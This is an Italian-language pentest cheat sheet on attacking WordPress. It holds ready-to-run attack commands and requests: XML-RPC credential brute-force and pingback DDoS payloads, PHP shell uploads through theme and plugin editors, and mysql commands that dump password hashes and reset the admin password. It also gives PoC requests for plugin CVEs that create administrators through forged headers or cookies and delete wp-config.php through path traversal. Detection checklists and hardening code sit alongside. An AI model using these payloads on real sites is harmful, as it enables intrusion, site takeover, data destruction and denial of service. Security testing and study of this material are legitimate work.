# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** quindi se modifichi qualche php del tema per ottenere RCE probabilmente userai quel percorso. Per esempio: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** puoi trovare la password root del database.
- Percorsi di login di default da verificare: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` contiene informazioni utili come la versione di WordPress installata.
- `wp-activate.php` è usato per il processo di attivazione via email durante la configurazione di un nuovo sito WordPress.
- Cartelle di login (possono essere rinominate per nasconderle):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` è un file che rappresenta una feature di WordPress che permette di trasmettere dati con HTTP come meccanismo di trasporto e XML come meccanismo di codifica. Questo tipo di comunicazione è stato sostituito dalla WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- La cartella `wp-content` è la directory principale dove sono memorizzati plugin e temi.
- `wp-content/uploads/` è la directory dove vengono salvati i file caricati sulla piattaforma.
- `wp-includes/` è la directory dove sono memorizzati i file core, come certificati, font, file JavaScript e widget.
- `wp-sitemap.xml` Nelle versioni di WordPress 5.5 e successive, WordPress genera un file sitemap XML con tutti i post pubblici e i tipi di post e tassonomie pubblicamente interrogabili.

**Post-exploitation**

- Il file `wp-config.php` contiene le informazioni richieste da WordPress per connettersi al database come il nome del database, host del database, username e password, authentication keys and salts, e il prefisso delle tabelle del database. Questo file di configurazione può anche essere usato per attivare la modalità DEBUG, utile per il troubleshooting.

### Permessi utenti

- **Administrator**
- **Editor**: Pubblica e gestisce i propri e gli altrui post
- **Author**: Pubblica e gestisce i propri post
- **Contributor**: Scrive e gestisce i propri post ma non può pubblicarli
- **Subscriber**: Visualizza i post e modifica il proprio profilo

## **Enumerazione passiva**

### **Ottenere la versione di WordPress**

Verifica se riesci a trovare i file `/license.txt` o `/readme.html`

All'interno del **codice sorgente** della pagina (esempio da [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- File CSS collegati

![](<../../images/image (533).png>)

- File JavaScript

![](<../../images/image (524).png>)

### Ottieni plugin
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ottenere temi
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Estrarre le versioni in generale
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumerazione attiva

### Plugins and Themes

Probabilmente non riuscirai a trovare tutti i Plugins e Themes possibili. Per scoprirli tutti, dovrai **eseguire attivamente Brute Force su una lista di Plugins and Themes** (per nostra fortuna esistono strumenti automatici che contengono queste liste).

### Utenti

- **ID Brute:** Ottieni utenti validi da un sito WordPress effettuando Brute Forcing sugli ID utente:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se le risposte sono **200** o **30X**, significa che l'id è **valido**. Se la risposta è **400**, allora l'id è **invalido**.

- **wp-json:** Puoi anche provare a ottenere informazioni sugli utenti interrogando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un altro endpoint `/wp-json/` che può rivelare alcune informazioni sugli utenti è:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Verranno fornite solo informazioni sugli utenti che hanno questa funzionalità abilitata**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Quando effettui il login in **`/wp-login.php`**, il **messaggio** è **diverso** a seconda che l'**username** esista o meno.

### XML-RPC

Se `xml-rpc.php` è attivo puoi eseguire un brute-force delle credentials o usarlo per lanciare attacchi DoS verso altre risorse. (Puoi automatizzare questo processo[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Controlla**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credenziali Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** sono alcuni dei metodi che possono essere usati per il brute-force delle credenziali. Se ne trovi uno puoi inviare qualcosa del tipo:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Il messaggio _"Incorrect username or password"_ all'interno di una risposta con codice 200 dovrebbe apparire se le credenziali non sono valide.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando le credenziali corrette puoi caricare un file. Nella risposta apparirà il percorso ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Esiste anche un modo **più veloce** per fare brute-force delle credenziali usando **`system.multicall`**, poiché puoi provare più credenziali nella stessa richiesta:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Questo metodo è pensato per programmi e non per esseri umani, ed è vecchio, quindi non supporta la 2FA. Quindi, se hai creds validi ma l'accesso principale è protetto da 2FA, **potresti essere in grado di abusare di xmlrpc.php per effettuare il login con quei creds bypassando la 2FA**. Nota che non potrai eseguire tutte le azioni che puoi fare tramite la console, ma potresti comunque arrivare a RCE come spiega Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Se riesci a trovare il metodo _**pingback.ping**_ nella lista puoi far sì che Wordpress invii una richiesta arbitraria a qualsiasi host/porta.\
Questo può essere usato per chiedere a **migliaia** di siti **Wordpress** di **accedere** a una sola **location** (quindi si causa un **DDoS** su quella location) oppure puoi usarlo per far **Wordpress** **scansionare** una rete interna (puoi specificare qualsiasi porta).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se ottieni **faultCode** con un valore **maggiore** di **0** (17), significa che la porta è aperta.

Dai un'occhiata all'uso di **`system.multicall`** nella sezione precedente per imparare come abusare di questo metodo per causare un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Questo file di solito si trova nella root del sito Wordpress: **`/wp-cron.php`**\
Quando questo file viene **acceduto** viene eseguita una **pesante** MySQL **query**, quindi può essere usato da **attackers** per **causare** un **DoS**.\
Inoltre, per default, `wp-cron.php` viene chiamato ad ogni caricamento della pagina (ogni volta che un client richiede una pagina Wordpress), il che su siti ad alto traffico può causare problemi (DoS).

Si raccomanda di disabilitare Wp-Cron e creare un vero cronjob sull'host che esegua le azioni necessarie a intervalli regolari (senza causare problemi).

### /wp-json/oembed/1.0/proxy - SSRF

Prova ad accedere a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e il Worpress site potrebbe effettuare una richiesta verso di te.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Questo tool verifica se esiste **methodName: pingback.ping** e il path **/wp-json/oembed/1.0/proxy**; se presenti, tenta di sfruttarli.

## Strumenti automatici
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Ottenere accesso sovrascrivendo un bit

Più che un vero attacco, questa è una curiosità. Nel CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) potevi invertire 1 bit di qualsiasi file di wordpress. Quindi potevi modificare il bit alla posizione `5389` del file `/var/www/html/wp-includes/user.php` per NOP l'operazione NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Pannello RCE**

**Modificare un file php del tema in uso (sono necessarie credenziali admin)**

Aspetto → Editor del tema → Template 404 (a destra)

Modifica il contenuto inserendo una php shell:

![](<../../images/image (384).png>)

Cerca su internet come accedere a quella pagina aggiornata. In questo caso devi accedere qui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puoi usare:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
per ottenere una sessione.

## Plugin RCE

### PHP plugin

Potrebbe essere possibile caricare file .php come plugin.\
Crea il tuo backdoor php usando per esempio:

![](<../../images/image (183).png>)

Poi aggiungi un nuovo plugin:

![](<../../images/image (722).png>)

Carica il plugin e premi Install Now:

![](<../../images/image (249).png>)

Clicca su Procced:

![](<../../images/image (70).png>)

Probabilmente apparentemente non succederà nulla, ma se vai in Media, vedrai la tua shell caricata:

![](<../../images/image (462).png>)

Accedi e vedrai l'URL per eseguire la reverse shell:

![](<../../images/image (1006).png>)

### Caricamento e attivazione di un plugin malevolo

Questo metodo implica l'installazione di un plugin malevolo noto per essere vulnerabile e che può essere sfruttato per ottenere una web shell. Questo processo viene eseguito tramite il WordPress dashboard come segue:

1. **Plugin Acquisition**: Il plugin si ottiene da una fonte come Exploit DB, ad esempio [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Vai al WordPress dashboard, quindi vai a `Dashboard > Plugins > Upload Plugin`.
- Carica il file zip del plugin scaricato.
3. **Plugin Activation**: Una volta che il plugin è stato installato correttamente, deve essere attivato tramite la dashboard.
4. **Sfruttamento**:
- Con il plugin "reflex-gallery" installato e attivato, può essere sfruttato in quanto noto per essere vulnerabile.
- Il framework Metasploit fornisce un exploit per questa vulnerabilità. Caricando il modulo appropriato ed eseguendo comandi specifici, è possibile ottenere una sessione meterpreter, concedendo accesso non autorizzato al sito.
- Si osserva che questo è solo uno dei tanti metodi per sfruttare un sito WordPress.

Il contenuto include elementi visivi che mostrano i passaggi nella dashboard di WordPress per installare e attivare il plugin. Tuttavia, è importante notare che sfruttare vulnerabilità in questo modo è illegale e non etico senza la dovuta autorizzazione. Queste informazioni devono essere usate responsabilmente e solo in un contesto legale, come penetration testing con esplicita autorizzazione.

**Per istruzioni più dettagliate controlla:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Da XSS a RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ è uno script progettato per elevare una vulnerabilità di **Cross-Site Scripting (XSS)** a **Remote Code Execution (RCE)** o ad altre vulnerabilità critiche in WordPress. Per maggiori informazioni consulta [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Fornisce **supporto per WordPress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crea un utente in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Carica il tuo plugin personalizzato (backdoor) su WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Modifica un Built-In Plugin in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Modifica un Built-In Theme in WordPress.
- _**(Custom) Custom Exploits:**_ Exploit personalizzati per plugin/theme di terze parti di WordPress.

## Post Exploitation

Estrai nomi utente e password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambia la password dell'admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superficie d'attacco

Sapere come un plugin di Wordpress possa esporre funzionalità è fondamentale per individuare vulnerabilità nella sua logica. Puoi vedere come un plugin possa esporre funzionalità nei punti elenco seguenti e alcuni esempi di plugin vulnerabili in [**questo post del blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uno dei modi in cui un plugin può esporre funzioni agli utenti è tramite handler AJAX. Queste funzioni possono contenere bug di logica, di autorizzazione o di autenticazione. Inoltre, è abbastanza frequente che tali funzioni basino sia l'autenticazione sia l'autorizzazione sull'esistenza di un wordpress nonce che **qualsiasi utente autenticato nell'istanza Wordpress potrebbe possedere** (indipendentemente dal ruolo).

Queste sono le funzioni che possono essere usate per esporre una funzione in un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'uso di `nopriv` rende l'endpoint accessibile a qualsiasi utente (anche non autenticati).**

> [!CAUTION]
> Inoltre, se la funzione verifica solo l'autorizzazione dell'utente tramite la funzione `wp_verify_nonce`, questa funzione verifica soltanto che l'utente sia autenticato, solitamente non controlla il ruolo dell'utente. Di conseguenza utenti con pochi privilegi potrebbero avere accesso ad azioni ad alto privilegio.

- **REST API**

È anche possibile esporre funzioni di wordpress registrando una REST API usando la funzione `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
La `permission_callback` è una funzione di callback che verifica se un dato utente è autorizzato a chiamare il metodo API.

**Se viene utilizzata la funzione integrata `__return_true`, salterà semplicemente il controllo delle autorizzazioni utente.**

- **Accesso diretto al file php**

Ovviamente, Wordpress usa PHP e i file all'interno dei plugin sono direttamente accessibili dal web. Quindi, nel caso un plugin esponga una funzionalità vulnerabile attivabile semplicemente accedendo al file, sarà sfruttabile da qualsiasi utente.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Alcuni plugin implementano scorciatoie di “trusted header” per integrazioni interne o reverse proxies e poi utilizzano quell'intestazione per impostare il contesto dell'utente corrente per le richieste REST. Se l'header non è vincolato crittograficamente alla richiesta da un componente upstream, un attaccante può falsificarlo e colpire rotte REST privilegiate come amministratore.

- Impact: escalatione dei privilegi non autenticata a amministratore creando un nuovo amministratore tramite la core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forza l'ID utente 1, tipicamente il primo account amministratore).
- Exploited route: `POST /wp-json/wp/v2/users` con un array di ruolo elevato.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Perché funziona

- Il plugin mappa un header controllato dal client allo stato di autenticazione e salta i controlli sulle capability.
- WordPress core si aspetta la capability `create_users` per questa route; l'hack del plugin la bypassa impostando direttamente il contesto dell'utente corrente dal header.

Indicatori di successo attesi

- HTTP 201 con un body JSON che descrive l'utente creato.
- Un nuovo utente admin visibile in `wp-admin/users.php`.

Lista di controllo per il rilevamento

- Grep per `getallheaders()`, `$_SERVER['HTTP_...']`, o vendor SDKs che leggono header personalizzati per impostare il contesto utente (es. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisionare le registrazioni REST per callback privilegiate che non hanno controlli `permission_callback` robusti e che si affidano invece agli header della richiesta.
- Cercare l'uso di funzioni core di gestione utenti (`wp_insert_user`, `wp_create_user`) all'interno di handler REST che sono protette solo da valori di header.

Mitigazioni

- Non derivare mai autenticazione o autorizzazione da header controllati dal client.
- Se un reverse proxy deve inserire l'identità, terminare la fiducia al proxy e rimuovere le copie inbound (es. `unset X-Wcpay-Platform-Checkout-User` at the edge), poi passare un token firmato e verificarlo lato server.
- Per le route REST che eseguono azioni privilegiate, richiedere controlli con `current_user_can()` e un `permission_callback` rigoroso (do NOT use `__return_true`).
- Preferire auth first-party (cookies, application passwords, OAuth) rispetto all'“impersonation” via header.

Riferimenti: vedere i link alla fine di questa pagina per un caso pubblico e un'analisi più ampia.

### Eliminazione Arbitraria di File non Autenticata via wp_ajax_nopriv (Litho Theme <= 3.0)

I theme e plugin WordPress espongono frequentemente handler AJAX tramite gli hook `wp_ajax_` e `wp_ajax_nopriv_`. Quando la variante **_nopriv_** viene utilizzata **la callback diventa raggiungibile da visitatori non autenticati**, quindi qualsiasi azione sensibile deve inoltre implementare:

1. Un **controllo delle capability** (es. `current_user_can()` o almeno `is_user_logged_in()`), e
2. Un **CSRF nonce** validato con `check_ajax_referer()` / `wp_verify_nonce()`, e
3. **Sanitizzazione / validazione rigorosa degli input**.

Il tema multipurpose Litho (< 3.1) si è dimenticato di implementare questi 3 controlli nella funzionalità *Remove Font Family* e ha finito per distribuire il seguente codice (semplificato):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi introdotti da questo snippet:

* **Unauthenticated access** – l'hook `wp_ajax_nopriv_` è registrato.
* **No nonce / capability check** – qualunque visitatore può raggiungere l'endpoint.
* **No path sanitisation** – la stringa `fontfamily` controllata dall'utente viene concatenata a un percorso del filesystem senza filtraggio, permettendo il classico `../../` traversal.

#### Exploitation

Un attaccante può eliminare qualsiasi file o directory **sotto la directory base uploads** (normalmente `<wp-root>/wp-content/uploads/`) inviando una singola richiesta HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Poiché `wp-config.php` si trova al di fuori di *uploads*, quattro sequenze `../` sono sufficienti in un'installazione predefinita. Eliminando `wp-config.php` si forza WordPress nella *procedura di installazione* alla visita successiva, consentendo un takeover completo del sito (l'attaccante fornisce semplicemente una nuova configurazione DB e crea un utente admin).

Altri target impattanti includono file `.php` di plugin/theme (per compromettere plugin di sicurezza) o regole `.htaccess`.

#### Detection checklist

* Qualsiasi callback `add_action( 'wp_ajax_nopriv_...')` che invoca helper del filesystem (`copy()`, `unlink()`, `$wp_filesystem->delete()`, ecc.).
* Concatenazione di input utente non sanitizzato nei path (cerca `$_POST`, `$_GET`, `$_REQUEST`).
* Assenza di `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

#### Hardening
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Sempre** tratta qualsiasi operazione di scrittura/cancellazione su disco come privilegiata e verifica due volte:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via ripristino di ruoli obsoleti e autorizzazione mancante (ASE "View Admin as Role")

Molti plugin implementano una funzionalità "view as role" o di cambio temporaneo di ruolo salvando i ruoli originali negli user meta in modo che possano essere ripristinati in seguito. Se il percorso di ripristino si basa solo sui parametri della request (e.g., `$_REQUEST['reset-for']`) e su una lista mantenuta dal plugin senza verificare le capability e un nonce valido, questo diventa una vertical privilege escalation.

Un esempio reale è stato trovato nel plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Il ramo di reset ripristinava i ruoli basandosi su `reset-for=<username>` se il nome utente compariva in un array interno `$options['viewing_admin_as_role_are']`, ma non eseguiva né un controllo `current_user_can()` né una verifica del nonce prima di rimuovere i ruoli correnti e riaggiungere i ruoli salvati negli user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Perché è sfruttabile

- Si fida di `$_REQUEST['reset-for']` e di un'opzione del plugin senza autorizzazione lato server.
- Se un utente in precedenza aveva privilegi più elevati salvati in `_asenha_view_admin_as_original_roles` ed è stato declassato, può ripristinarli visitando il percorso di reset.
- In alcune installazioni, qualsiasi utente autenticato potrebbe avviare un reset per un altro username ancora presente in `viewing_admin_as_role_are` (autorizzazione non corretta).

Prerequisiti dell'attacco

- Versione del plugin vulnerabile con la funzionalità abilitata.
- L'account target ha un ruolo di alto privilegio obsoleto memorizzato nei user meta da un uso precedente.
- Qualsiasi sessione autenticata; mancanza di nonce/capability nel flusso di reset.

Sfruttamento (esempio)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Nelle build vulnerabili questo rimuove i ruoli correnti e riaggiunge i ruoli originali salvati (es., `administrator`), causando di fatto un'escalation di privilegi.

Checklist di rilevamento

- Cerca funzionalità di role-switching che persistono gli “original roles” nei user meta (es., `_asenha_view_admin_as_original_roles`).
- Individua percorsi di reset/restore che:
- Leggono username da `$_REQUEST` / `$_GET` / `$_POST`.
- Modificano ruoli tramite `add_role()` / `remove_role()` senza `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizzano basandosi su un array di opzioni del plugin (es., `viewing_admin_as_role_are`) invece che sulle capability dell'attore.

Mitigazioni

- Applicare controlli sulle capability in ogni ramo che modifica lo stato (es., `current_user_can('manage_options')` o più restrittivo).
- Richiedere nonces per tutte le mutazioni di ruoli/permessi e verificarli: `check_admin_referer()` / `wp_verify_nonce()`.
- Non fidarsi mai di username forniti dalla request; risolvere l'utente target lato server basandosi sull'attore autenticato e su una policy esplicita.
- Invalidare lo stato degli “original roles” durante aggiornamenti di profile/ruolo per evitare il ripristino di privilegi elevati obsoleti:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Valuta di conservare uno stato minimo e di usare token a tempo limitato e protetti da capability per switch temporanei di ruolo.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Alcuni plugin collegano user-switching helpers al public `init` hook e ricavano l'identità da un cookie controllato dal client. Se il codice chiama `wp_set_auth_cookie()` senza verificare authentication, capability e un nonce valido, qualsiasi visitatore non autenticato può forzare il login come un arbitrario user ID.

Pattern tipico vulnerabile (semplificato da Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Perché è sfruttabile

- Il hook pubblico `init` rende il handler raggiungibile da utenti non autenticati (nessun controllo `is_user_logged_in()`).
- L'identità è derivata da un cookie modificabile dal client (`original_user_id`).
- Una chiamata diretta a `wp_set_auth_cookie($uid)` effettua il login del richiedente come quell'utente senza controlli di capability/nonce.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Considerazioni sul WAF per i CVE di WordPress/plugin

I WAF edge/server generici sono tarati per pattern ampi (SQLi, XSS, LFI). Molte vulnerabilità ad alto impatto di WordPress/plugin sono bug di logica dell'applicazione o di auth che appaiono come traffico benigno a meno che il motore non comprenda le route di WordPress e la semantica dei plugin.

Offensive notes

- Mira agli endpoint specifici del plugin con payload puliti: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Esegui prima i percorsi non autenticati (AJAX `nopriv`, REST con permissive `permission_callback`, public shortcodes). I payload di default spesso funzionano senza offuscamento.
- Casi tipici ad alto impatto: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Non fare affidamento su firme WAF generiche per proteggere i CVE dei plugin. Implementa patch virtuali a livello applicazione specifiche per la vulnerabilità o aggiorna rapidamente.
- Preferisci controlli di sicurezza in modalità positiva nel codice (capabilities, nonces, strict input validation) piuttosto che filtri negativi basati su regex.

## Protezione di WordPress

### Aggiornamenti regolari

Assicurati che WordPress, i plugin e i temi siano aggiornati. Conferma inoltre che l'aggiornamento automatico sia abilitato in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Inoltre, **installa solo plugin e temi WordPress affidabili**.

### Plugin di sicurezza

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Altre raccomandazioni**

- **Rimuovi** l'utente predefinito **admin**
- **Usa** **password complesse** e **2FA**
- **Rivedi** periodicamente i **permessi** degli utenti
- **Limita i tentativi di login** per prevenire attacchi Brute Force
- Rinomina il file **`wp-admin.php`** e consenti l'accesso solo internamente o da alcuni indirizzi IP.


### SQL Injection non autenticata tramite validazione insufficiente (WP Job Portal <= 2.3.2)

Il plugin di recruitment WP Job Portal esponeva un task **savecategory** che alla fine esegue il seguente codice vulnerabile all'interno di `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemi introdotti da questo snippet:

1. **Input utente non sanitizzato** – `parentid` proviene direttamente dalla richiesta HTTP.
2. **Concatenazione di stringhe nella clausola WHERE** – assenza di `is_numeric()` / `esc_sql()` / prepared statement.
